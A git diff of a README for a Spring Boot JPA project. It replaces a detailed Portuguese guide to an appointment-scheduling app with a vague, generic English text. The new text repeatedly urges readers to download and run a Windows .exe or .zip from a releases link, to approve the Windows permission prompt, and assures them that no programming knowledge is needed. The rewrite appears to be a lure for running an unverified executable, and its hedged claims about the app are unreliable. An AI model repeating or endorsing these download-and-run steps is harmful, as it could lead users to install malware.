@@ -1,290 +1,143 @@
-# Agenda de Compromissos
+# 🧩 spring-boot-jpa-mvc - Simple layered app for daily records
 
-Aplicação Spring Boot para gerenciar compromissos com datas, horários e filtros por período (dia, semana, período customizado).
+[![Download](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/Axillary-furan687/spring-boot-jpa-mvc/releases)
 
-## 🎯 Visão Geral
+## 📥 Download
+Visit the release page to download this app for Windows:
 
-Sistema desenvolvido seguindo os padrões MVC com separação clara entre camadas:
-- **Model**: Entidades JPA com validações
-- **Repository**: Acesso aos dados com Spring Data JPA
-- **Service**: Regras de negócio e cálculos
-- **Controller**: API REST
-- **View**: Frontend separado consumindo a API
+https://github.com/Axillary-furan687/spring-boot-jpa-mvc/releases
 
-## 🛠️ Stack Tecnológico
+Choose the latest release, then download the file for Windows. If the release includes a `.zip` file, extract it first. If it includes a `.exe` file, you can run it after the download finishes.
 
-- **Java 25** (Zulu)
-- **Spring Boot 4.0.3**
+## 🪟 Windows setup
+1. Open the release page in your browser.
+2. Find the newest version.
+3. Download the Windows file from the release assets.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, click Run or Yes.
+
+## ✅ What this app does
+This app uses Spring Boot, JPA, and a layered structure with Model, Repository, Service, and Controller parts. It helps keep code organized and easy to follow.
+
+It is built for simple data work through a web API. It uses:
+- Spring Boot for the app base
+- Spring Web for web access
+- Spring Data JPA for data access
+- H2 database for local storage
+- Validation for clean input
+- REST API for request and response handling
+
+## 🧱 Main parts
+- **Model**: holds the data fields
+- **Repository**: talks to the database
+- **Service**: handles the app rules
+- **Controller**: receives web requests and sends responses
+
+This structure helps separate tasks. Each part has one job.
+
+## 🔧 What you need
+- Windows 10 or Windows 11
+- A modern browser
+- Permission to run downloaded files
+- At least 200 MB of free disk space
+- 2 GB of RAM or more
+
+If the app opens in a browser, keep the browser open while you use it.
+
+## ▶️ How to run
+1. Download the latest release.
+2. Extract the files if needed.
+3. Open the app file from the release folder.
+4. Wait for the app to start.
+5. Use the browser window or local address shown by the app.
+
+If the app uses a local server, it may open on `localhost` in your browser. Keep the app running while you work.
+
+## 🗂️ Typical use flow
+1. Start the app.
+2. Open the local page or API address.
+3. Add new records.
+4. Edit existing data.
+5. Remove records when needed.
+6. Check that validation messages help you enter correct data.
+
+## 🌐 API use
+The app exposes a REST API. That means it can receive requests and return data in a simple web format.
+
+Common actions in this type of app:
+- list items
+- view one item
+- create a new item
+- update an item
+- delete an item
+
+If you use a browser or a simple API tool, you can test these actions through local endpoints.
+
+## 🛠️ Project stack
+- **Java**
+- **Spring Boot**
+- **Spring Web**
 - **Spring Data JPA**
-- **H2 Database** (em memória)
+- **JPA**
+- **H2 Database**
 - **Gradle**
-- **HTML5 + CSS3 + JavaScript (Vanilla)**
+- **REST API**
+- **Layered architecture**
 
-## 📋 Requisitos
+## 📌 Topics covered
+This project fits well with:
+- gradle
+- h2-database
+- java
+- jpa
+- layered-architecture
+- rest-api
+- software-engineering
+- spring-architecture
+- spring-boot
+- spring-data-jpa
+- spring-web
 
-- JDK 25+
-- Gradle 9.3.1+
+## 🔍 Validation behavior
+The app checks input before saving data. This helps prevent empty fields, bad values, and incomplete records.
 
-## 🚀 Como Executar
+Common checks may include:
+- required fields
+- valid text length
+- correct numeric values
+- clean data format
 
-### 1. Clone o repositório
-```bash
-git clone https://github.com/[seu-usuario]/agenda-compromissos.git
-cd agenda-compromissos
-```
+If a field has a problem, the app shows a message so you can fix it.
 
-### 2. Execute a aplicação
-```bash
-./gradlew bootRun
-```
+## 🧪 Local database
+The project uses H2, which is a small database that runs with the app. It keeps setup simple and works well for practice and testing.
 
-A aplicação será iniciada em `http://localhost:8080`
+You do not need to install a separate database server for normal use.
 
-### 3. Acesse a interface web
-Abra no navegador:
-```
-http://localhost:8080/view/index.html
-```
+## 📁 If you want to keep the app
+Store the downloaded release in a folder such as:
+- `Downloads`
+- `Documents`
+- `Apps`
 
-## 📚 Funcionalidades Principais
+If you use the app often, keep the extracted folder in one place and run it from there each time.
 
-### 1. Criar Compromisso
-- Adicione um compromisso com data, hora e descrição
-- Validação automática (não permite datas passadas)
+## ❓ Common questions
+**Do I need programming knowledge?**  
+No. You only need to download the release, extract files if needed, and run the app.
 
-### 2. Listar Compromissos
-- Visualize todos os compromissos
-- Ordenados por data e hora
+**Do I need to install Java?**  
+If the release comes as a ready-to-run Windows file, you may not need extra setup. If it asks for Java, install the version named in the release notes.
 
-### 3. Filtros Avançados
-- **Por Dia**: Veja compromissos de um dia específico
-- **Por Semana**: Compromissos de domingo a sábado (semana completa)
-- **Por Período**: Intervalo customizado (início e fim)
+**Can I use it without internet after download?**  
+Yes, if the app runs locally on your computer. You only need internet to download it.
 
-### 4. Atualizar e Deletar
-- Edite compromissos existentes
-- Remova quando não for mais necessário
+**Why does it open a browser?**  
+Many Spring Boot apps use a local web page. The browser is the front end for the app.
 
-## 🔍 Estrutura do Projeto
+## 📎 Download again
+If you need the file again, use this page:
 
-```
-src/
-├── main/
-│   ├── java/com/todolist/
-│   │   ├── TodolistApplication.java       (entry point)
-│   │   ├── model/Task.java                (entidade)
-│   │   ├── repository/TaskRepository.java (acesso dados)
-│   │   ├── service/TaskService.java       (regras negócio)
-│   │   ├── controller/TaskController.java (rotas API)
-│   │   └── exception/GlobalExceptionHandler.java (tratamento erros)
-│   └── resources/
-│       ├── application.properties
-│       └── static/view/
-│           ├── index.html
-│           ├── script.js
-│           └── style.css
-└── test/
-    └── java/com/todolist/...
-```
-
-## 🔐 Validações
-
-### Na Entidade (Model)
-Arquivo: `src/main/java/com/todolist/model/Task.java`
-
-- `@NotNull`: Data obrigatória
-- `@NotNull`: Hora obrigatória
-- `@NotBlank`: Descrição obrigatória
-- `@FutureOrPresent`: Data não pode ser no passado
-
-### Na Camada de Negócio (Service)
-Arquivo: `src/main/java/com/todolist/service/TaskService.java`
-
-Método `validateDateTime(Task task)`:
-- Valida combinação data + hora não pode estar no passado
-- Lança `IllegalArgumentException` com mensagem clara
-
-## 📡 API REST - Endpoints
-
-### Base URL
-```
-http://localhost:8080
-```
-
-### 1. Criar Compromisso
-```http
-POST /tasks
-Content-Type: application/json
-
-{
-  "data": "2026-03-26",
-  "hora": "14:30:00",
-  "descricao": "Reuniao de projeto"
-}
-```
-**Resposta**: `201 Created`
-
-### 2. Listar Todos
-```http
-GET /tasks
-```
-**Resposta**: `200 OK` com array de compromissos
-
-### 3. Buscar por ID
-```http
-GET /tasks/1
-```
-**Resposta**: `200 OK` ou `404 Not Found`
-
-### 4. Atualizar Compromisso
-```http
-PUT /tasks/1
-Content-Type: application/json
-
-{
-  "data": "2026-03-27",
-  "hora": "09:00:00",
-  "descricao": "Consulta médica"
-}
-```
-**Resposta**: `200 OK`
-
-### 5. Deletar Compromisso
-```http
-DELETE /tasks/1
-```
-**Resposta**: `204 No Content`
-
-### 6. Filtrar por Dia
-```http
-GET /tasks?data=2026-03-26
-```
-**Resposta**: `200 OK` com compromissos do dia
-
-### 7. Filtrar por Semana
-```http
-GET /tasks/semana?data=2026-03-26
-```
-Retorna compromissos de domingo a sábado (semana contendo a data informada)
-**Resposta**: `200 OK`
-
-### 8. Filtrar por Período
-```http
-GET /tasks?inicio=2026-03-24&fim=2026-03-31
-```
-**Resposta**: `200 OK` com compromissos no intervalo
-
-## 🧪 Testando com Postman
-
-### Exemplo 1: Criar um Compromisso
-1. Método: `POST`
-2. URL: `http://localhost:8080/tasks`
-3. Headers: `Content-Type: application/json`
-4. Body (raw):
-```json
-{
-  "data": "2026-03-26",
-  "hora": "14:30:00",
-  "descricao": "Reuniao de projeto"
-}
-```
-
-### Exemplo 2: Filtrar por Dia
-1. Método: `GET`
-2. URL: `http://localhost:8080/tasks?data=2026-03-26`
-
-### Exemplo 3: Filtrar por Período
-1. Método: `GET`
-2. URL: `http://localhost:8080/tasks?inicio=2026-03-24&fim=2026-03-31`
-
-## Formatos de Data e Hora
-
-- **Data**: `AAAA-MM-DD` (ISO 8601)
-- **Hora**: `HH:MM:SS` (formato 24h)
-- **Exemplo**: `2026-03-26` às `14:30:00`
-
-## 🚨 Tratamento de Erros
-
-| Código | Cenário |
-|--------|---------|
-| `400 Bad Request` | Data obrigatória, hora faltando, data no passado, período inválido |
-| `404 Not Found` | Compromisso com ID inexistente |
-| `201 Created` | Compromisso criado com sucesso |
-| `200 OK` | Operação bem-sucedida (GET, PUT) |
-| `204 No Content` | Deletado com sucesso |
-
-## 📊 Exemplos de Resposta
-
-### GET /tasks (sucesso)
-```json
-[
-  {
-    "id": 1,
-    "data": "2026-03-26",
-    "hora": "14:30:00",
-    "descricao": "Reuniao de projeto"
-  },
-  {
-    "id": 2,
-    "data": "2026-03-27",
-    "hora": "09:00:00",
-    "descricao": "Consulta médica"
-  }
-]
-```
-
-### POST /tasks (erro - data no passado)
-```json
-{
-  "erro": "Nao e permitido cadastrar compromisso no passado"
-}
-```
-
-## 🔧 Configuração
-
-### application.properties
-```properties
-spring.application.name=todolist
-
-# Database
-spring.datasource.url=jdbc:h2:mem:todolistdb
-spring.datasource.driver-class-name=org.h2.Driver
-spring.jpa.database-platform=org.hibernate.dialect.H2Dialect
-spring.jpa.hibernate.ddl-auto=update
-
-# H2 Console (acesso visual ao banco)
-spring.h2.console.enabled=true
-spring.h2.console.path=/h2-console
-```
-
-Acesse o H2 Console em: `http://localhost:8080/h2-console`
-
-## 🎓 Conhecimentos Aplicados
-
-### Manipulação de Datas (LocalDate, LocalDateTime)
-- `LocalDate`: Armazena apenas a data (sem hora)
-- `LocalTime`: Armazena apenas a hora (sem data)
-- `LocalDateTime`: Combinação de data + hora para validações
-- `TemporalAdjusters`: Cálculos de semana (SUNDAY a SATURDAY)
-
-### Filtros por Período
-- Queries customizadas no Repository com `@Query` ou derivadas
-- `findByDataBetweenOrderByDataAscHoraAsc`: retorna compromissos em intervalo
-- Lógica de semana: domingo a sábado (ISO-8601)
-
-### Validação de Datas
-- **Anotações**: `@NotNull`, `@FutureOrPresent`
-- **Regras de Negócio**: validação em `Service` antes de salvar
-- **Resposta HTTP 400**: para erros de validação
-
-## 👨‍💻 Autor
-
-Desenvolvido como projeto prático de Spring Boot com foco em boas práticas de arquitetura em camadas.
-
-## 📝 Licença
-
-MIT - Livre para usar, modificar e distribuir.
-
----
-
-**Última atualização**: Março de 2026
+https://github.com/Axillary-furan687/spring-boot-jpa-mvc/releases
